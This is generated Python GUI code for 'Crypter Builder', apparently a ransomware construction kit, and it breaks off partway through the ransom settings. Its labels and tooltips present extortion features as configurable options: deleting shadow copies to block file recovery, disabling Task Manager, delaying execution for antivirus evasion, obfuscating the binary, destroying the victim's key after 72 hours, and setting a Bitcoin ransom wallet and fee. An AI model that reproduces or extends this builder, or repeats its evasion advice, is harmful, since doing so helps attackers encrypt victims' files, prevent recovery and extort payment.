# -*- coding: utf-8 -*-

###########################################################################
## Python code generated with wxFormBuilder (version Oct 26 2018)
## http://www.wxformbuilder.org/
##
## PLEASE DO *NOT* EDIT THIS FILE!
###########################################################################

import wx
import wx.xrc

###########################################################################
## Class MainFrame
###########################################################################

class MainFrame ( wx.Frame ):

	def __init__( self, parent ):
		wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = u"Crypter Builder", pos = wx.DefaultPosition, size = wx.Size( 650,850 ), style = wx.CAPTION|wx.CLOSE_BOX|wx.MINIMIZE_BOX|wx.RESIZE_BORDER|wx.SYSTEM_MENU|wx.TAB_TRAVERSAL )

		self.SetSizeHints( wx.DefaultSize, wx.DefaultSize )
		self.SetBackgroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_BTNFACE ) )

		bSizer1 = wx.BoxSizer( wx.VERTICAL )

		bSizer1.SetMinSize( wx.Size( 640,850 ) )
		bSizer311 = wx.BoxSizer( wx.HORIZONTAL )

		self.HeaderPanel = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		bSizer48 = wx.BoxSizer( wx.VERTICAL )

		bSizer49 = wx.BoxSizer( wx.HORIZONTAL )

		self.LoadConfigFileLabel = wx.StaticText( self.HeaderPanel, wx.ID_ANY, u"Load Config file", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.LoadConfigFileLabel.Wrap( -1 )

		self.LoadConfigFileLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD, False, "Arial" ) )

		bSizer49.Add( self.LoadConfigFileLabel, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL|wx.TOP, 5 )

		self.LoadFilePicker = wx.FilePickerCtrl( self.HeaderPanel, wx.ID_ANY, wx.EmptyString, u"Select a file", u"*.*", wx.DefaultPosition, wx.DefaultSize, wx.FLP_FILE_MUST_EXIST|wx.FLP_OPEN )
		self.LoadFilePicker.SetToolTip( u"Load an existing configuration file" )

		bSizer49.Add( self.LoadFilePicker, 0, wx.ALL, 5 )


		bSizer49.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.CurrentConfigFileLabel = wx.StaticText( self.HeaderPanel, wx.ID_ANY, u"Current Config File:", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.CurrentConfigFileLabel.Wrap( -1 )

		self.CurrentConfigFileLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD, False, "Arial" ) )

		bSizer49.Add( self.CurrentConfigFileLabel, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL|wx.TOP, 5 )

		self.CurrentConfigFile = wx.StaticText( self.HeaderPanel, wx.ID_ANY, u"None", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.CurrentConfigFile.Wrap( -1 )

		bSizer49.Add( self.CurrentConfigFile, 0, wx.ALIGN_CENTER_VERTICAL|wx.ALL|wx.TOP, 5 )


		bSizer48.Add( bSizer49, 0, wx.EXPAND, 5 )


		self.HeaderPanel.SetSizer( bSizer48 )
		self.HeaderPanel.Layout()
		bSizer48.Fit( self.HeaderPanel )
		bSizer311.Add( self.HeaderPanel, 1, wx.EXPAND |wx.ALL, 5 )


		bSizer1.Add( bSizer311, 0, wx.EXPAND, 5 )

		self.m_staticline2 = wx.StaticLine( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.LI_HORIZONTAL )
		bSizer1.Add( self.m_staticline2, 0, wx.EXPAND |wx.ALL, 5 )

		self.ConfigScrollableWindow = wx.ScrolledWindow( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.VSCROLL )
		self.ConfigScrollableWindow.SetScrollRate( 5, 5 )
		bSizer2 = wx.BoxSizer( wx.VERTICAL )

		self.GuideScrollableWindow = wx.ScrolledWindow( self.ConfigScrollableWindow, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.HSCROLL|wx.VSCROLL|wx.BORDER_STATIC )
		self.GuideScrollableWindow.SetScrollRate( 5, 5 )
		self.GuideScrollableWindow.SetBackgroundColour( wx.Colour( 255, 255, 255 ) )

		bSizer44 = wx.BoxSizer( wx.VERTICAL )

		self.TitleLabel = wx.StaticText( self.GuideScrollableWindow, wx.ID_ANY, u"Crypter Builder", wx.DefaultPosition, wx.DefaultSize, wx.ALIGN_CENTER_HORIZONTAL )
		self.TitleLabel.Wrap( -1 )

		self.TitleLabel.SetFont( wx.Font( 22, wx.FONTFAMILY_MODERN, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD, False, "Courier" ) )
		self.TitleLabel.SetForegroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_GRAYTEXT ) )
		self.TitleLabel.SetBackgroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_WINDOW ) )

		bSizer44.Add( self.TitleLabel, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )

		self.SubtitleLabel = wx.StaticText( self.GuideScrollableWindow, wx.ID_ANY, u"Created by Sithis993", wx.DefaultPosition, wx.DefaultSize, wx.ALIGN_CENTER_HORIZONTAL )
		self.SubtitleLabel.Wrap( -1 )

		self.SubtitleLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_MODERN, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Courier" ) )

		bSizer44.Add( self.SubtitleLabel, 0, wx.ALL|wx.EXPAND, 5 )

		self.LogoBitmap = wx.StaticBitmap( self.GuideScrollableWindow, wx.ID_ANY, wx.NullBitmap, wx.DefaultPosition, wx.DefaultSize, 0 )
		bSizer44.Add( self.LogoBitmap, 0, wx.ALL|wx.EXPAND, 10 )

		self.QuickBuildTitleLabel = wx.StaticText( self.GuideScrollableWindow, wx.ID_ANY, u"Quick Build", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.QuickBuildTitleLabel.Wrap( 359 )

		self.QuickBuildTitleLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_MODERN, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD, True, "Courier" ) )

		bSizer44.Add( self.QuickBuildTitleLabel, 0, wx.ALL|wx.EXPAND, 5 )

		self.QuickBuildDescriptionLabel = wx.StaticText( self.GuideScrollableWindow, wx.ID_ANY, u"To create the ransomware binary immediately, leave the fields below blank and click the BUILD button. This will produce the ransomware binary with the default settings", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.QuickBuildDescriptionLabel.Wrap( 359 )

		self.QuickBuildDescriptionLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_MODERN, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Courier" ) )

		bSizer44.Add( self.QuickBuildDescriptionLabel, 0, wx.ALL|wx.EXPAND, 10 )

		self.CustomisingBuildTitleLabel = wx.StaticText( self.GuideScrollableWindow, wx.ID_ANY, u"Customising the ransomware", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.CustomisingBuildTitleLabel.Wrap( 359 )

		self.CustomisingBuildTitleLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_MODERN, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD, True, "Courier" ) )

		bSizer44.Add( self.CustomisingBuildTitleLabel, 0, wx.ALL|wx.EXPAND, 5 )

		self.CustomisingBuildDescriptionLabel = wx.StaticText( self.GuideScrollableWindow, wx.ID_ANY, u"The ransomware can be easily customised by adjusting any or all of the options below. For more information on each field, including a description and the expected input, hover the mouse cursor over the field's label or input box to view its tooltip. \nFields left blank will be set to the default configuration.\n\nTo see an example configuration, click the browse button at the top of the app and load the \"config_example.cfg\" file.", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.CustomisingBuildDescriptionLabel.Wrap( 340 )

		self.CustomisingBuildDescriptionLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_MODERN, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Courier" ) )

		bSizer44.Add( self.CustomisingBuildDescriptionLabel, 0, wx.ALL, 10 )

		self.ManagingConfigurationsTitleLabel = wx.StaticText( self.GuideScrollableWindow, wx.ID_ANY, u"Managing Configurations", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.ManagingConfigurationsTitleLabel.Wrap( 359 )

		self.ManagingConfigurationsTitleLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_MODERN, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD, True, "Courier" ) )

		bSizer44.Add( self.ManagingConfigurationsTitleLabel, 0, wx.ALL|wx.EXPAND, 5 )

		self.ManagingConfigurationsDescriptionLabel = wx.StaticText( self.GuideScrollableWindow, wx.ID_ANY, u"Optionally, if you'd like to save your ransomware configuration click the Save button at the bottom of this form. Existing configurations can be loaded by clicking the Load button at the top of the interface.", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.ManagingConfigurationsDescriptionLabel.Wrap( 340 )

		self.ManagingConfigurationsDescriptionLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_MODERN, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Courier" ) )

		bSizer44.Add( self.ManagingConfigurationsDescriptionLabel, 0, wx.ALL, 10 )


		self.GuideScrollableWindow.SetSizer( bSizer44 )
		self.GuideScrollableWindow.Layout()
		bSizer44.Fit( self.GuideScrollableWindow )
		bSizer2.Add( self.GuideScrollableWindow, 1, wx.ALL|wx.EXPAND, 5 )

		self.m_staticline6 = wx.StaticLine( self.ConfigScrollableWindow, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.LI_HORIZONTAL )
		bSizer2.Add( self.m_staticline6, 0, wx.EXPAND |wx.ALL, 5 )

		bSizer31 = wx.BoxSizer( wx.HORIZONTAL )

		self.m_panel31 = wx.Panel( self.ConfigScrollableWindow, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		LanguageSettingsSizer = wx.StaticBoxSizer( wx.StaticBox( self.m_panel31, wx.ID_ANY, u"Language" ), wx.HORIZONTAL )

		bSizer202 = wx.BoxSizer( wx.HORIZONTAL )

		self.BuilderLanguageLabel = wx.StaticText( LanguageSettingsSizer.GetStaticBox(), wx.ID_ANY, u"Builder Language", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.BuilderLanguageLabel.Wrap( -1 )

		self.BuilderLanguageLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial Unicode MS" ) )
		self.BuilderLanguageLabel.SetToolTip( u"The language of this GUI" )

		bSizer202.Add( self.BuilderLanguageLabel, 0, wx.ALL|wx.TOP, 7 )


		bSizer202.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		BuilderLanguageChoiceChoices = [ u"English" ]
		self.BuilderLanguageChoice = wx.Choice( LanguageSettingsSizer.GetStaticBox(), wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, BuilderLanguageChoiceChoices, 0 )
		self.BuilderLanguageChoice.SetSelection( 0 )
		self.BuilderLanguageChoice.SetToolTip( u"The language of this GUI" )

		bSizer202.Add( self.BuilderLanguageChoice, 0, wx.ALL, 5 )


		LanguageSettingsSizer.Add( bSizer202, 1, 0, 5 )


		self.m_panel31.SetSizer( LanguageSettingsSizer )
		self.m_panel31.Layout()
		LanguageSettingsSizer.Fit( self.m_panel31 )
		bSizer31.Add( self.m_panel31, 1, wx.ALL, 5 )

		self.m_panel311 = wx.Panel( self.ConfigScrollableWindow, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		DebugSettingsSizer = wx.StaticBoxSizer( wx.StaticBox( self.m_panel311, wx.ID_ANY, u"Debug" ), wx.HORIZONTAL )

		bSizer2021 = wx.BoxSizer( wx.HORIZONTAL )

		self.DebugLevelLabel = wx.StaticText( DebugSettingsSizer.GetStaticBox(), wx.ID_ANY, u"Debug Level", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.DebugLevelLabel.Wrap( -1 )

		self.DebugLevelLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial Unicode MS" ) )
		self.DebugLevelLabel.SetToolTip( u"The debug level of the build process. Select a higher level to increase the verbosity of the build output shown in the console box below" )

		bSizer2021.Add( self.DebugLevelLabel, 0, wx.ALL|wx.TOP, 7 )


		bSizer2021.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		DebugLevelChoiceChoices = [ u"0 - Minimal", u"1 - Low", u"2 - Medium", u"3 - High" ]
		self.DebugLevelChoice = wx.Choice( DebugSettingsSizer.GetStaticBox(), wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, DebugLevelChoiceChoices, 0 )
		self.DebugLevelChoice.SetSelection( 3 )
		self.DebugLevelChoice.SetToolTip( u"The debug level of the build process. Select a higher level to increase the verbosity of the build output shown in the console box below" )

		bSizer2021.Add( self.DebugLevelChoice, 0, wx.ALL, 5 )


		DebugSettingsSizer.Add( bSizer2021, 1, 0, 5 )


		self.m_panel311.SetSizer( DebugSettingsSizer )
		self.m_panel311.Layout()
		DebugSettingsSizer.Fit( self.m_panel311 )
		bSizer31.Add( self.m_panel311, 1, wx.ALL, 5 )


		bSizer2.Add( bSizer31, 0, wx.EXPAND, 5 )

		bSizer12 = wx.BoxSizer( wx.VERTICAL )

		self.m_panel41 = wx.Panel( self.ConfigScrollableWindow, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		self.m_panel41.SetToolTip( u"The path to the UPX Packer directory. If left blank, UPX will not be utilised and the executable will not be packed.\n\nIt is recommended that UPX is used as this can reduce the Crypter executable size by several Megabytes." )

		BinarySettingsSizer = wx.StaticBoxSizer( wx.StaticBox( self.m_panel41, wx.ID_ANY, u"Binary Settings" ), wx.VERTICAL )

		bSizer391 = wx.BoxSizer( wx.VERTICAL )

		bSizer41111 = wx.BoxSizer( wx.HORIZONTAL )

		bSizer20321211 = wx.BoxSizer( wx.HORIZONTAL )

		self.PyinstallerAesKeyLabel = wx.StaticText( BinarySettingsSizer.GetStaticBox(), wx.ID_ANY, u"Pyinstaller AES Key", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.PyinstallerAesKeyLabel.Wrap( -1 )

		self.PyinstallerAesKeyLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial Unicode MS" ) )
		self.PyinstallerAesKeyLabel.SetToolTip( u"The AES key used by Pyinstaller to encrypt the ransomware script files. This field is optional, but provides Crypter with a layer of obfuscation by making it more difficult to reverse engineer. Leave this field blank if you don't want to use this functionality" )

		bSizer20321211.Add( self.PyinstallerAesKeyLabel, 0, wx.ALL|wx.TOP, 7 )


		bSizer20321211.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.PyInstallerAesKeyTextCtrl = wx.TextCtrl( BinarySettingsSizer.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.PyInstallerAesKeyTextCtrl.SetToolTip( u"The AES key used by Pyinstaller to encrypt the ransomware script files. This field is optional, but provides Crypter with a layer of obfuscation by making it more difficult to reverse engineer. Leave this field blank if you don't want to use this functionality" )

		bSizer20321211.Add( self.PyInstallerAesKeyTextCtrl, 0, wx.ALL, 5 )


		bSizer41111.Add( bSizer20321211, 1, wx.EXPAND, 5 )

		bSizer203211111 = wx.BoxSizer( wx.HORIZONTAL )

		self.IconLabel = wx.StaticText( BinarySettingsSizer.GetStaticBox(), wx.ID_ANY, u"File Icon", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.IconLabel.Wrap( -1 )

		self.IconLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial Unicode MS" ) )
		self.IconLabel.SetToolTip( u"The icon (.ico) file to use for the Crypter executable. If left blank PyInstaller will use its own icon.\n\nWarning: choosing an non standard EXE icon, such as a PDF logo, may drastically increase the rate of detection" )

		bSizer203211111.Add( self.IconLabel, 0, wx.ALL|wx.TOP, 7 )


		bSizer203211111.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.IconFilePicker = wx.FilePickerCtrl( BinarySettingsSizer.GetStaticBox(), wx.ID_ANY, wx.EmptyString, u"Select a file", u"*.ico", wx.DefaultPosition, wx.DefaultSize, wx.FLP_DEFAULT_STYLE|wx.FLP_FILE_MUST_EXIST|wx.FLP_SMALL )
		self.IconFilePicker.SetToolTip( u"The icon (.ico) file to use for the Crypter executable. If left blank PyInstaller will use its own icon.\n\nWarning: choosing an non standard EXE icon, such as a PDF logo, may drastically increase the rate of detection" )

		bSizer203211111.Add( self.IconFilePicker, 0, wx.ALL, 5 )


		bSizer41111.Add( bSizer203211111, 1, wx.EXPAND, 5 )


		bSizer391.Add( bSizer41111, 1, wx.EXPAND, 5 )

		bSizer411111 = wx.BoxSizer( wx.HORIZONTAL )

		bSizer2032111111 = wx.BoxSizer( wx.HORIZONTAL )

		self.UpxDirLabel = wx.StaticText( BinarySettingsSizer.GetStaticBox(), wx.ID_ANY, u"UPX Packer Directory", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.UpxDirLabel.Wrap( -1 )

		self.UpxDirLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial Unicode MS" ) )
		self.UpxDirLabel.SetToolTip( u"The path to the UPX Packer directory. If left blank, UPX will not be utilised and the executable will not be packed.\n\nIt is recommended that UPX is used as this can reduce the Crypter executable size by several Megabytes" )

		bSizer2032111111.Add( self.UpxDirLabel, 0, wx.ALL|wx.TOP, 7 )


		bSizer2032111111.Add( ( 0, 0), 1, wx.ALIGN_LEFT|wx.EXPAND, 5 )

		self.UpxDirPicker = wx.DirPickerCtrl( BinarySettingsSizer.GetStaticBox(), wx.ID_ANY, wx.EmptyString, u"Select UPX Directory", wx.DefaultPosition, wx.DefaultSize, wx.DIRP_DEFAULT_STYLE|wx.DIRP_SMALL )
		self.UpxDirPicker.SetToolTip( u"The path to the UPX Packer directory. If left blank, UPX will not be utilised and the executable will not be packed.\n\nIt is recommended that UPX is used as this can reduce the Crypter executable size by several Megabytes" )

		bSizer2032111111.Add( self.UpxDirPicker, 0, wx.ALL, 5 )


		bSizer411111.Add( bSizer2032111111, 1, wx.EXPAND, 5 )

		bSizer2032111112 = wx.BoxSizer( wx.HORIZONTAL )


		bSizer2032111112.Add( ( 0, 0), 1, wx.EXPAND, 5 )


		bSizer411111.Add( bSizer2032111112, 1, wx.EXPAND, 5 )


		bSizer391.Add( bSizer411111, 1, wx.EXPAND, 5 )


		BinarySettingsSizer.Add( bSizer391, 0, wx.EXPAND, 5 )


		self.m_panel41.SetSizer( BinarySettingsSizer )
		self.m_panel41.Layout()
		BinarySettingsSizer.Fit( self.m_panel41 )
		bSizer12.Add( self.m_panel41, 0, wx.ALL|wx.EXPAND, 5 )

		self.m_panel4 = wx.Panel( self.ConfigScrollableWindow, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
		RansomwareSettingsSizer = wx.StaticBoxSizer( wx.StaticBox( self.m_panel4, wx.ID_ANY, u"Ransomware Settings" ), wx.VERTICAL )

		bSizer39 = wx.BoxSizer( wx.VERTICAL )

		sbSizer13 = wx.StaticBoxSizer( wx.StaticBox( RansomwareSettingsSizer.GetStaticBox(), wx.ID_ANY, u"General" ), wx.VERTICAL )

		bSizer59 = wx.BoxSizer( wx.HORIZONTAL )

		bSizer60 = wx.BoxSizer( wx.HORIZONTAL )

		self.OpenGuiOnLoginLabel = wx.StaticText( sbSizer13.GetStaticBox(), wx.ID_ANY, u"Open GUI on Login", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.OpenGuiOnLoginLabel.Wrap( -1 )

		self.OpenGuiOnLoginLabel.SetToolTip( u"If ticked, the GUI will be launched each time the user logs in.\n\nWarning: Enabling this option may significantly increase the rate of Anti-Virus detection" )

		bSizer60.Add( self.OpenGuiOnLoginLabel, 0, wx.ALL, 5 )


		bSizer60.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.OpenGuiOnLoginCheckbox = wx.CheckBox( sbSizer13.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.OpenGuiOnLoginCheckbox.SetValue(True)
		self.OpenGuiOnLoginCheckbox.SetToolTip( u"If ticked, the GUI will be launched each time the user logs in.\n\nWarning: Enabling this option may significantly increase the rate of Anti-Virus detection" )

		bSizer60.Add( self.OpenGuiOnLoginCheckbox, 0, wx.ALL, 5 )


		bSizer59.Add( bSizer60, 1, wx.EXPAND, 5 )

		bSizer61 = wx.BoxSizer( wx.HORIZONTAL )

		self.TimeDelayLabel = wx.StaticText( sbSizer13.GetStaticBox(), wx.ID_ANY, u"Time Delay (s)", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.TimeDelayLabel.Wrap( -1 )

		self.TimeDelayLabel.SetToolTip( u"If ticked, the GUI will be launched each time the user logs in.\n\nWarning: Enabling this option may significantly increase the rate of Anti-Virus detection" )

		bSizer61.Add( self.TimeDelayLabel, 0, wx.ALL, 5 )


		bSizer61.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.TimeDelayTextCtrl = wx.TextCtrl( sbSizer13.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.TimeDelayTextCtrl.SetMaxLength( 20 )
		self.TimeDelayTextCtrl.SetToolTip( u"The number of seconds to wait after the file is opened before ransomware execution begins. Useful for AV evasion" )

		bSizer61.Add( self.TimeDelayTextCtrl, 0, wx.ALL, 5 )


		bSizer59.Add( bSizer61, 1, wx.EXPAND, 5 )


		sbSizer13.Add( bSizer59, 1, wx.EXPAND, 5 )

		bSizer411 = wx.BoxSizer( wx.HORIZONTAL )

		bSizer2032131 = wx.BoxSizer( wx.HORIZONTAL )

		self.DeleteShadowCopiesLabel = wx.StaticText( sbSizer13.GetStaticBox(), wx.ID_ANY, u"Delete Shadow Copies", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.DeleteShadowCopiesLabel.Wrap( -1 )

		self.DeleteShadowCopiesLabel.SetToolTip( u"If ticked, all shadow copy files on the system will be deleted. These shadows are backup copies of the machine's files and can be used to gain access to the encrypted data without the decryption key.\n\nWarning: This operation will fail silently if the user does not have sufficient privileges" )

		bSizer2032131.Add( self.DeleteShadowCopiesLabel, 0, wx.ALL, 5 )


		bSizer2032131.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.DeleteShadowCopiesCheckbox = wx.CheckBox( sbSizer13.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.DeleteShadowCopiesCheckbox.SetValue(True)
		self.DeleteShadowCopiesCheckbox.SetToolTip( u"If ticked, all shadow copy files on the system will be deleted. These shadows are backup copies of the machine's files and can be used to gain access to the encrypted data without the decryption key.\n\nWarning: This operation will fail silently if the user does not have sufficient privileges" )

		bSizer2032131.Add( self.DeleteShadowCopiesCheckbox, 0, wx.ALL, 5 )


		bSizer411.Add( bSizer2032131, 1, wx.EXPAND, 5 )

		bSizer20321112 = wx.BoxSizer( wx.HORIZONTAL )

		self.DisableTaskManagerLabel = wx.StaticText( sbSizer13.GetStaticBox(), wx.ID_ANY, u"Disable Task Manager", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.DisableTaskManagerLabel.Wrap( -1 )

		self.DisableTaskManagerLabel.SetToolTip( u"If ticked, Windows Task Manager will be disabled when Crypter is opened.\n\nWarning: Whilst enabling this option helps prevent users from killing the executable, it can greatly increase the rate of Anti-Virus detection" )

		bSizer20321112.Add( self.DisableTaskManagerLabel, 0, wx.ALL, 5 )


		bSizer20321112.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.DisableTaskManagerCheckbox = wx.CheckBox( sbSizer13.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.DisableTaskManagerCheckbox.SetToolTip( u"If ticked, Windows Task Manager will be disabled when Crypter is opened.\n\nWarning: Whilst enabling this option helps prevent users from killing the executable, it can greatly increase the rate of Anti-Virus detection" )

		bSizer20321112.Add( self.DisableTaskManagerCheckbox, 0, wx.ALL, 5 )


		bSizer411.Add( bSizer20321112, 1, wx.EXPAND, 5 )


		sbSizer13.Add( bSizer411, 1, wx.EXPAND, 5 )

		bSizer4112 = wx.BoxSizer( wx.HORIZONTAL )

		bSizer20321311 = wx.BoxSizer( wx.HORIZONTAL )

		self.GuiTitleLabel = wx.StaticText( sbSizer13.GetStaticBox(), wx.ID_ANY, u"GUI Title", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.GuiTitleLabel.Wrap( -1 )

		self.GuiTitleLabel.SetToolTip( u"The title to display in the GUI. Defaults to \"CRYPTER\".\n\nNote: This field is limited to a maximum of 20 characters to prevent window stretching" )

		bSizer20321311.Add( self.GuiTitleLabel, 0, wx.ALL, 5 )


		bSizer20321311.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.GuiTitleTextCtrl = wx.TextCtrl( sbSizer13.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.GuiTitleTextCtrl.SetMaxLength( 20 )
		self.GuiTitleTextCtrl.SetToolTip( u"The title to display in the GUI. Defaults to \"CRYPTER\".\n\nNote: This field is limited to a maximum of 20 characters to prevent window stretching" )

		bSizer20321311.Add( self.GuiTitleTextCtrl, 0, wx.ALL, 5 )


		bSizer4112.Add( bSizer20321311, 1, wx.EXPAND, 5 )

		bSizer203211121 = wx.BoxSizer( wx.HORIZONTAL )

		self.KeyDestructionTimeLabel = wx.StaticText( sbSizer13.GetStaticBox(), wx.ID_ANY, u"Key Destruction Time (s)", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.KeyDestructionTimeLabel.Wrap( -1 )

		self.KeyDestructionTimeLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial Unicode MS" ) )
		self.KeyDestructionTimeLabel.SetToolTip( u"The time in seconds before the victim's decryption key is destroyed. Once the time runs out, the victim will no longer be able to decrypt their files. Defaults to 259200 (72 hours)" )

		bSizer203211121.Add( self.KeyDestructionTimeLabel, 0, wx.ALL|wx.TOP, 7 )


		bSizer203211121.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.KeyDestructionTimeTextCtrl = wx.TextCtrl( sbSizer13.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.KeyDestructionTimeTextCtrl.SetForegroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_WINDOWTEXT ) )
		self.KeyDestructionTimeTextCtrl.SetToolTip( u"The time in seconds before the victim's decryption key is destroyed. Once the time runs out, the victim will no longer be able to decrypt their files. Defaults to 259200 (72 hours)" )

		bSizer203211121.Add( self.KeyDestructionTimeTextCtrl, 0, wx.ALL, 5 )


		bSizer4112.Add( bSizer203211121, 1, wx.EXPAND, 5 )


		sbSizer13.Add( bSizer4112, 1, wx.EXPAND, 5 )

		bSizer412 = wx.BoxSizer( wx.HORIZONTAL )

		bSizer2032112 = wx.BoxSizer( wx.HORIZONTAL )

		self.WalletAddressLabel = wx.StaticText( sbSizer13.GetStaticBox(), wx.ID_ANY, u"Wallet Address", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.WalletAddressLabel.Wrap( -1 )

		self.WalletAddressLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial Unicode MS" ) )
		self.WalletAddressLabel.SetToolTip( u"The Bitcoin wallet address that the victim should pay the ransom to. This will be displayed in the Crypter GUI. Defaults to the bitcoin wallet of Crypter's author ;-)" )

		bSizer2032112.Add( self.WalletAddressLabel, 0, wx.ALL|wx.TOP, 7 )


		bSizer2032112.Add( ( 0, 0), 1, wx.EXPAND, 5 )

		self.WalletAddressTextCtrl = wx.TextCtrl( sbSizer13.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
		self.WalletAddressTextCtrl.SetToolTip( u"The Bitcoin wallet address that the victim should pay the ransom to. This will be displayed in the Crypter GUI. Defaults to the bitcoin wallet of Crypter's author ;-)" )

		bSizer2032112.Add( self.WalletAddressTextCtrl, 0, wx.ALL, 5 )


		bSizer412.Add( bSizer2032112, 1, wx.EXPAND, 5 )

		bSizer203212 = wx.BoxSizer( wx.HORIZONTAL )

		self.BitcoinFeeLabel = wx.StaticText( sbSizer13.GetStaticBox(), wx.ID_ANY, u"Bitcoin Fee", wx.DefaultPosition, wx.DefaultSize, 0 )
		self.BitcoinFeeLabel.Wrap( -1 )

		self.BitcoinFeeLabel.SetFont( wx.Font( 9, wx.FONTFAMILY_SWISS, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Arial Unicode MS" ) )
		self.BitcoinFeeLabel.SetToolTip( u"The Bitcoin Fee that you want to victim to pay. This amount will be shown in the GUI. Defaults to 1.0" )

		bSizer203212.Add( self.BitcoinFeeLabel, 0, wx.ALL|wx.TOP, 7 )


